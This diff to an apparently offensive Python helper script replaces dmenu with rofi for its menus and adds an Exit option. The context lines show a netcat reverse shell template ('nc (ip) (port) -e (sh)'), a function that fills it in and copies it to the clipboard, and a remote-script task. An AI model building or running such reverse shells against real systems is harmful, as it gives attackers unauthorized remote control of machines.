@@ -5,8 +5,11 @@ import dmenu
 from os import listdir, system
 from os.path import isfile, join, exists
 from pathlib import Path
+import rofi
 
 home = str(Path.home())
+
+r = rofi.Rofi()
 
 
 # Helper Functions
@@ -16,8 +19,15 @@ copy = lambda text: \
 						clipboard.copy(text)
 buildShellCommand = lambda reverseShellTemplate, ip, port, sh: \
 						reverseShellTemplates[reverseShellTemplate].replace("(ip)", ip).replace("(port)", port).replace("(sh)", sh)
-buildPrompt = lambda options, prompt: \
-						dmenu.show(options, prompt=prompt, lines=len(options), font="Monospace-16:normal")
+
+def buildPrompt(options, prompt):
+		# rofi_args.append(f"{home}/.shlol/rofi_theme.rasi")
+	if len(options) == 0:
+		answer = r.text_entry(prompt, rofi_args=[])
+		return answer
+	else:
+		index, key = r.select(prompt, options, rofi_args=[])
+		return list(options)[index]
 
 reverseShellTemplates = {
 	"netcat": "nc (ip) (port) -e (sh)",
@@ -28,7 +38,8 @@ reverseShellTemplates = {
 
 menu = buildPrompt([
 	"Reverse Shell",
-	"Run Remote Script (creates a web server)"
+	"Run Remote Script (creates a web server)",
+	"Exit"
 ], "Task")
 
 if menu == "Reverse Shell":
